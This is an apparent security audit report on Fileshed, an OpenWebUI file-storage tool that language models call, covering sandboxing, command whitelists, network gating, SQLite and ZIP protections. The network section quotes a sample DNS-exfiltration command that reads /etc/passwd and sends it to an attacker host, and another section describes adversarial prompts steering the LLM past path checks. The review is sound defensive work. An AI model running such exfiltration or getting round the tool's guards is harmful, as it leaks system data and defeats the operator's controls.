# Security and Architecture Audit Report

## Audit Metadata

| Field | Value |
|-------|-------|
| **Audited File** | `Fileshed.py` |
| **Tool Version** | 1.0.3 |
| **Audit Date** | 2026-01-30 |
| **Auditor** | Multi-axis Security Review |
| **OpenWebUI Target Version** | 0.4.0+ |
| **Total Lines of Code** | 8,765 |

---

## Executive Summary

Fileshed is a well-engineered OpenWebUI tool providing persistent file storage with multi-user collaboration. The implementation demonstrates mature security thinking with defense-in-depth across filesystem, command execution, network access, and database operations. The separation between public API (`shed_*` methods) and internal implementation (`_FileshedCore`) effectively limits LLM attack surface. Administrative controls (valves) appropriately gate sensitive features like network access. Key residual risks stem from the inherent complexity of sandboxing shell commands and the file-based locking model's limitations in distributed deployments.

---

## Axis 1: Architecture and Code Organization

### Intent and Behavior

The tool follows a strict three-layer architecture:
1. **Public API Layer** (`class Tools`): 37 `shed_*` functions exposed to LLM
2. **Internal Core Layer** (`class _FileshedCore`): Implementation logic hidden from LLM
3. **Infrastructure Layer**: Direct calls to `subprocess`, `sqlite3`, `shutil`, `pathlib`

Zone abstraction unifies four storage contexts (Uploads, Storage, Documents, Group) via `ZoneContext` dataclass.

### Strengths

- The `_FileshedCore` class pattern effectively exploits OpenWebUI's tool introspection behavior, ensuring internal methods like `_exec_command` and `_validate_path` are not visible to the LLM in the function schema.
- Single-file design is deliberately chosen for atomic deployment—no risk of version mismatches between module files.
- `ZoneContext` dataclass centralizes zone-specific logic (whitelist selection, git commit behavior, editzone paths), reducing scattered conditional logic.
- Consistent JSON response format with structured error codes facilitates LLM error recovery.
- Comprehensive docstrings serve dual purpose: developer documentation and LLM guidance.

### Weaknesses

- The file's 8,765 lines strain maintainability; logical groupings exist but rely on comments rather than structural separation.
- `_FileshedCore` maintains a back-reference to `Tools` via `self._tools` to access valves—this bidirectional coupling is acceptable but slightly awkward.
- Some helper methods (`_format_size`, `_strip_sql_comments`) could be static but access instance state via `self.valves`.

### Assessment: ★★★★☆

Architecturally sound with appropriate security boundaries. The LLM-isolation pattern is effective and well-documented.

---

## Axis 2: Public API Surface and LLM Exposure

### Intent and Behavior

Only methods prefixed with `shed_` are exposed to the LLM. The spec explicitly documents this design to prevent LLMs from attempting to call internal methods directly.

### Strengths

- Clear naming convention (`shed_*`) provides unambiguous boundary.
- Internal methods in separate class (`_FileshedCore`) rather than underscore-prefixed methods in `Tools` class—this exploits OpenWebUI's class method exposure mechanism.
- Function signatures include `__user__` and `__metadata__` parameters for OpenWebUI context injection.
- Default parameter handling (`None` to `{}` conversion) prevents `AttributeError` on missing context.

### Weaknesses

- The `allow_zone_in_path` parameter appears in most functions—a determined LLM could learn to always pass `True`, bypassing the path-starts-with-zone protection. This is mitigated by requiring explicit user intent.
- Error messages occasionally leak internal details (e.g., "Resolved path escapes allowed zone") that could aid adversarial prompt crafting.

### Assessment: ★★★★★

The public/internal boundary is well-designed and robust. LLM cannot directly invoke dangerous internal methods.

---

## Axis 3: Filesystem Access and Path Traversal Prevention

### Intent and Behavior

All file operations are constrained within zone roots via `_resolve_chroot_path()` and `_validate_relative_path()`. Symlink escape detection adds defense-in-depth.

### Strengths

- `_resolve_chroot_path()` performs both logical (`..` component tracking) and physical (symlink resolution) validation.
- Unicode normalization (`unicodedata.normalize("NFC")`) prevents path confusion attacks via decomposed characters.
- Symlink checks walk the path component-by-component, detecting intermediate symlinks that escape the zone.
- Path arguments to shell commands are validated via `_validate_path_args()` with zone-aware prefix detection.
- Protected paths (`.git`) are handled appropriately in write operations.

### Weaknesses

- The symlink check in `_resolve_chroot_path()` has a TOCTOU window: a symlink could be created between validation and use. This is partially mitigated by the chroot enforcement on the final resolved path.
- The zone-prefix detection (`PATH_STARTS_WITH_ZONE` error) can be bypassed with `allow_zone_in_path=True`—appropriate for edge cases but requires trust in user/LLM intent.
- Regex expressions in sed/grep starting with `/` are special-cased (`_is_expression_not_path`)—the heuristics are reasonable but imperfect.

### Assessment: ★★★★☆

Strong path traversal prevention with defense-in-depth. Minor TOCTOU window exists but practical exploitation requires concurrent malicious filesystem access.

---

## Axis 4: Command Execution Security

### Intent and Behavior

Shell commands are executed via `subprocess.run()` with list arguments (no shell interpretation). Command and argument validation enforces whitelists and blocks dangerous patterns.

### Strengths

- **Whitelist architecture**: `WHITELIST_READONLY` for Uploads, `WHITELIST_READWRITE` for writable zones—principle of least privilege.
- **Blacklist reinforcement**: `BLACKLIST_COMMANDS` blocks shells, interpreters, and system utilities regardless of whitelist.
- **Argument sanitization**: `DANGEROUS_ARGS_PATTERN` blocks shell metacharacters (`;`, `|`, `&&`, `$(`), preventing argument injection even though `subprocess.run()` with list args avoids shell interpretation.
- **Command-specific validation**:
  - `find -exec` explicitly blocked
  - `awk system()` and `getline` pipes blocked
  - Git subcommands validated against separate whitelists
  - curl/wget require output file (`-o`/`-O`) to prevent context pollution
- **Resource limits**: `preexec_fn` sets `RLIMIT_AS` (memory) and `RLIMIT_CPU` (CPU time) via `resource.setrlimit()`.
- **Output truncation**: Prevents LLM context flooding with configurable limits.

### Weaknesses

- **`preexec_fn` thread-safety**: `subprocess.run()` with `preexec_fn` is not safe in multi-threaded contexts. If OpenWebUI uses threading (likely in async handlers), this could cause deadlocks. The documentation for `preexec_fn` explicitly warns about this.
- **Pattern-based validation limitations**: Regex cannot catch all dangerous constructs. For example, the pattern blocks `$(` but not `$'...'` (ANSI-C quoting), though list-mode subprocess mitigates this.
- **awk ENVIRON blocked via regex**: `\bENVIRON\b` pattern could be bypassed with equivalent constructs (though awk's environment access surface is limited).
- **`xargs` removal justification**: While removed for security, this limits legitimate use cases. The rationale is sound but may frustrate users.

### Residual Risk

A misconfigured or future command added to the whitelist without corresponding argument validation could introduce vulnerabilities. The defense relies on the completeness of pattern matching.

### Assessment: ★★★★☆

Robust command execution sandboxing with appropriate defense-in-depth. The `preexec_fn` thread-safety issue is a notable technical concern in async environments.

---

## Axis 5: Network Access Control

### Intent and Behavior

Network access is gated by the `network_mode` valve (admin-only): `disabled` (default), `safe` (download-only), `all` (unrestricted).

### Strengths

- **Three-tier model**: Default-deny with explicit admin opt-in for network features.
- **Protocol-level blocking**: `CURL_FORBIDDEN_GET_OPTS` blocks POST/PUT options in `safe` mode.
- **ffmpeg exfiltration prevention**: Output protocols (rtmp, tcp, udp, http) blocked in `safe` mode; dangerous options (`-metadata`, `-filter_complex`, `-method`) blocked.
- **Git granularity**: `clone/fetch/pull` require `safe`; `push` requires `all`.
- **URL pattern detection**: `URL_PATTERN` blocks URLs in non-network commands when network is disabled.
- **Network-capable command awareness**: `NETWORK_OUTPUT_COMMANDS` vs `NETWORK_INPUT_COMMANDS` distinguish exfiltration-capable from download-only tools.

### Weaknesses

- **DNS exfiltration not addressed**: A command like `dig $(cat /etc/passwd).attacker.com` would be blocked by dangerous pattern detection, but legitimate DNS-querying tools (if added to whitelist) could exfiltrate via DNS. Currently not a risk since no DNS tools are whitelisted.
- **ffmpeg `-filter_complex`**: The block is broad—some legitimate filter chains are harmless. However, erring on the side of caution is appropriate.
- **`pandoc` with URLs**: In `safe`/`all` mode, pandoc can fetch remote resources. Malicious documents could trigger SSRF. This is inherent to pandoc's design.

### Assessment: ★★★★★

Network access control is well-designed with appropriate granularity. Admin-only configuration prevents user/LLM escalation.

---

## Axis 6: SQLite Security

### Intent and Behavior

The `shed_sqlite()` function provides SQLite query execution with dangerous operation blocking and optional read-only mode.

### Strengths

- **Dangerous pattern blocking**: `ATTACH`, `DETACH`, `LOAD_EXTENSION` are blocked after SQL comment stripping.
- **Comment stripping**: `_strip_sql_comments()` removes `/* */` and `-- ` comments before pattern matching, preventing bypass via `AT/**/TACH`.
- **`sqlite_readonly` valve**: Admin can restrict to SELECT/PRAGMA/EXPLAIN only.
- **Parameterized queries**: `params` list enables safe parameter binding, preventing SQL injection in user queries.
- **Row limits**: Default 10-row limit prevents context flooding; `MAX_SQL_ROWS` (10,000) hard limit protects against memory exhaustion.
- **Table name validation**: Regex `^[a-zA-Z_][a-zA-Z0-9_]*$` prevents injection in CSV import table names.

### Weaknesses

- **Comment stripping edge cases**: Nested comments (`/* /* */`) are handled by non-greedy regex but deeply nested cases might behave unexpectedly. SQLite doesn't support nested comments, so this is low risk.
- **Column name sanitization**: During CSV import, column names are cleaned with `re.sub(r'[^\w]', '_', ...)`. This could cause collisions (e.g., "col-1" and "col_1" both become "col_1").
- **No query timeout**: The `sqlite3.connect()` has `timeout=10.0` for lock acquisition but no query execution timeout. A malicious query (e.g., recursive CTE) could run indefinitely. The subprocess resource limits do not apply to in-process sqlite3.

### Assessment: ★★★★☆

SQLite security is well-implemented. The lack of query execution timeout is a minor gap for DoS resilience.

---

## Axis 7: Concurrency, Locking, and Crash Recovery

### Intent and Behavior

File locks use atomic file creation (`O_CREAT | O_EXCL`) with JSON metadata. Locks are conversation-scoped and time-limited.

### Strengths

- **Atomic lock acquisition**: `os.open()` with `O_CREAT | O_EXCL` prevents race conditions.
- **Lock metadata**: Stores `conv_id`, `user_id`, `locked_at`, `path` for audit and recovery.
- **Same-conversation re-lock**: Allows idempotent `shed_lockedit_open()` calls.
- **Lock expiration**: `lock_max_age_hours` valve enables automatic cleanup via `shed_maintenance()`.
- **Forced unlock**: `shed_force_unlock()` allows recovery from crashed sessions.
- **Editzone cleanup**: Failed edit operations clean up both lock and editzone files.

### Weaknesses

- **Single-instance only**: As documented in SPEC.md, file locks do not work reliably across NFS or in multi-container deployments. This is an acknowledged limitation, not a bug.
- **No distributed lock support**: For production multi-instance deployments, external locking (Redis, database) would be required.
- **Lock-editzone TOCTOU**: Between lock acquisition and editzone copy, another process could modify the source file. This is inherent to file-based locking.

### Assessment: ★★★☆☆

Appropriate for single-instance deployments. Distributed deployment limitations are documented but represent a significant constraint for enterprise use.

---

## Axis 8: Multi-User and Group Permission Model

### Intent and Behavior

Group spaces support file ownership with three modes: `owner` (owner-write), `group` (all-write), `owner_ro` (read-only).

### Strengths

- **OpenWebUI Groups integration**: Uses `Groups.get_groups_by_member_id()` for membership verification.
- **Ownership database**: SQLite `file_ownership` table with group/path/owner/mode schema.
- **Mode flexibility**: Three write modes cover common collaboration patterns.
- **Ownership transfer**: `shed_group_chown()` allows ownership handoff with membership validation.
- **Group quota enforcement**: Separate `quota_per_group_mb` valve from per-user quota.

### Weaknesses

- **Group ID validation**: Case-sensitive name matching could confuse users (documented but friction-inducing).
- **No group admin distinction**: All group members have equal capability; no owner/admin/member hierarchy.
- **Orphaned ownership records**: If a file is deleted outside Fileshed, ownership records persist in database. `shed_maintenance()` could be extended to clean these.

### Assessment: ★★★★☆

The permission model is well-suited for team collaboration. Lack of admin hierarchy is a design choice, not a flaw, but limits enterprise governance scenarios.

---

## Axis 9: ZIP Archive Security

### Intent and Behavior

`shed_unzip()` extracts ZIP archives with protections against ZIP Slip and ZIP bombs.

### Strengths

- **ZIP Slip prevention**: Each archive member path is resolved and validated against the destination directory.
- **Magic byte verification**: Validates ZIP file signatures (`PK\x03\x04`, etc.) beyond extension checking.
- **ZIP bomb protection**:
  - File count limit: `ZIP_MAX_FILES = 10,000`
  - Decompressed size limit: `ZIP_MAX_DECOMPRESSED_SIZE = 500 MB`
  - Compression ratio limit: `ZIP_MAX_COMPRESSION_RATIO = 100:1`
- **Pre-extraction symlink check**: TOCTOU protection verifies destination is not a symlink immediately before extraction.
- **Nested ZIP handling**: Documented behavior—inner ZIPs are extracted as files, requiring explicit re-extraction (applies all protections again).

### Weaknesses

- **Extraction atomicity**: Partial extraction on error leaves some files; cleanup logic removes extracted files but may miss some in race conditions.
- **Symbolic link entries**: The code checks for destination symlinks but ZIP entries that are symlinks could point outside—`zipfile.extractall()` doesn't follow them, but caution is warranted.

### Assessment: ★★★★★

Comprehensive ZIP security with layered protections against known attack vectors.

---

## Axis 10: Error Handling and Information Disclosure

### Intent and Behavior

All functions return JSON with structured error codes. Sensitive internal details are filtered from error messages.

### Strengths

- **Structured error codes**: 50+ defined error codes enable programmatic error handling.
- **Error hints**: User-friendly hints guide recovery without exposing internals.
- **No absolute paths in errors**: Error messages use relative paths and zone names.
- **No user ID exposure in cross-user contexts**: Group permission errors don't reveal other users' IDs.

### Weaknesses

- **Broad exception handlers**: Many functions end with `except Exception: return ... "An unexpected error occurred"`. While this prevents information leakage, it also hides debugging information. For production, these should log to an admin-accessible location.
- **Stack traces suppressed**: Intentional but makes troubleshooting difficult without server access.

### Assessment: ★★★★☆

Appropriate error handling for LLM-facing tool. Operational debugging could be improved with optional logging.

---

## Axis 11: LLM Misuse Resistance

### Intent and Behavior

The tool includes extensive documentation and guardrails to guide LLM usage patterns.

### Strengths

- **Warning comments**: Prominent `⚠️ LLM WARNING` section in file header.
- **HOWTO guides**: Built-in documentation via `shed_help(howto=...)` covering common workflows.
- **Path-starts-with-zone detection**: Catches common LLM mistake of including zone name in path.
- **Required output files**: curl/wget require `-o`/`-O` to prevent context pollution—LLM cannot accidentally dump large downloads.
- **Contextual error hints**: Error responses include usage examples relevant to the function.

### Weaknesses

- **`allow_zone_in_path` escape hatch**: An adversarial prompt could instruct the LLM to always use this parameter.
- **No rate limiting**: A malicious prompt could instruct rapid repeated operations. This is partially mitigated by OpenWebUI's conversation turn limits.

### Assessment: ★★★★☆

Good LLM guardrails with reasonable escape hatches for legitimate edge cases.

---

## Axis 12: OpenWebUI Integration

### Intent and Behavior

The tool integrates with OpenWebUI via the `Tools` class pattern, valve configuration, and internal API bridges.

### Strengths

- **`_OpenWebUIBridge` isolation**: Version-specific imports are centralized, facilitating future version adaptation.
- **Valve configuration**: All sensitive settings (network, quotas, paths) are admin-only.
- **Groups API integration**: Leverages OpenWebUI's existing group membership for access control.
- **File API integration**: Download links created via OpenWebUI's file management system.

### Weaknesses

- **Internal API dependency**: Relies on `open_webui.models.files` and `open_webui.models.groups` which may change between versions.
- **No version detection**: The bridge doesn't actively detect or adapt to different OpenWebUI versions; it tries imports and fails.

### Assessment: ★★★★☆

Well-integrated with appropriate isolation of version-specific code. Internal API dependencies are an inherent risk with any deep integration.

---

## Final Overall Assessment

### Summary by Category

| Axis | Rating | Weight | Weighted |
|------|--------|--------|----------|
| Architecture | ★★★★☆ | High | 4 |
| Public API | ★★★★★ | Critical | 5 |
| Filesystem | ★★★★☆ | Critical | 4 |
| Command Execution | ★★★★☆ | Critical | 4 |
| Network Access | ★★★★★ | Critical | 5 |
| SQLite | ★★★★☆ | High | 4 |
| Concurrency | ★★★☆☆ | Medium | 3 |
| Permissions | ★★★★☆ | High | 4 |
| ZIP Security | ★★★★★ | High | 5 |
| Error Handling | ★★★★☆ | Medium | 4 |
| LLM Resistance | ★★★★☆ | High | 4 |
| OpenWebUI Integration | ★★★★☆ | Medium | 4 |

### Final Rating: ★★★★☆ (4/5)

Fileshed demonstrates security-conscious design appropriate for its threat model (LLM-driven file operations in a semi-trusted environment). The critical security axes (command execution, filesystem, network) are well-implemented with defense-in-depth. The primary limitations are operational (single-instance locking) rather than security-critical.

---

## Actionable Recommendations

### High Priority

1. **Replace `preexec_fn` with `start_new_session`**: Use `subprocess.Popen` with `start_new_session=True` and apply resource limits via `prlimit` command or cgroups instead of `preexec_fn` to avoid thread-safety issues.

2. **Add SQLite query timeout**: Wrap query execution with a Python-level timeout (e.g., `signal.alarm` in non-threaded context, or use `sqlite3` progress handler with row count limit).

3. **Document multi-instance limitations prominently**: Add a warning in the OpenWebUI tool description that file locking is unreliable in multi-container deployments.

### Medium Priority

4. **Implement optional structured logging**: Add an `enable_debug_logging` valve that writes to a file (not stdout) for operational debugging without exposing details to users/LLMs.

5. **Add orphan ownership cleanup**: Extend `shed_maintenance()` to remove ownership records for non-existent files in group spaces.

6. **Consider symlink-in-ZIP handling**: Explicitly skip or warn on symbolic link entries in ZIP archives during extraction.

### Low Priority

7. **Column name collision handling**: During CSV import, detect and suffix conflicting sanitized column names (e.g., `col_1`, `col_1_2`).

8. **Version-aware bridge**: Add explicit OpenWebUI version detection in `_OpenWebUIBridge` with graceful degradation messages.

---

*End of Audit Report*
